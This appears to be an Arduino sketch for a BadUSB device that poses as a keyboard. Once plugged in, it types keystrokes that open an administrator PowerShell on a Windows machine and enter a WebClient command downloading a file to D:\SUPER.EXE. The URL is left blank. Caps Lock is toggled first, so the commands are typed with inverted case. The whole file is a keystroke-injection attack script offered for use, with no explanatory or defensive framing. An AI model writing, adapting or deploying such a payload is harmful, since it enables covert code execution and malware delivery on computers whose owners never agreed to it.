
/*
   www.小空格.com

   22/09/2019

*/


#include <Keyboard.h>


void setup() {
  // put your setup code here, to run once:

  delay(200);

  Keyboard.begin();
  delay(700);

  Keyboard.press(KEY_CAPS_LOCK);
  delay(20);
  Keyboard.release(KEY_CAPS_LOCK);

  delay(500);
  // press
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('r');
  delay(200);
  // release
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');

  delay(500);

  // Open administrator-level PowerShell
  Keyboard.println("POWERSHELL.EXE -COMMAND START-PROCESS -VERB RUNaS");

  delay(500);

  // Minimize CMD windows
  // Keyboard.println("cmd.exe /T:01 /K mode CON:COLS=16 LINES=1");

  // PowerShell definition of an object
  Keyboard.println("$P = nEW-oBJECT sYSTEM.nET.wEBcLIENT");
  Keyboard.println("$P.dOWNLOADfILE('HTTP://','D:\\sUPER.EXE')");





}

void loop() {
  // put your main code here, to run repeatedly:

}
